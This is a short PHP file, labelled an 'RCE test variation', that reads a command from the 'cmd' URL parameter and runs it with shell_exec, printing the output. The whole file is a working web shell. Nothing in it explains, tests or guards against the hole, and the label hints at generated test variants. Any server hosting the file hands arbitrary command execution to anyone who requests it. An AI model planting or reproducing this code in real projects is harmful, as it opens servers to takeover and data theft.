<?php
// RCE test variation #474
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>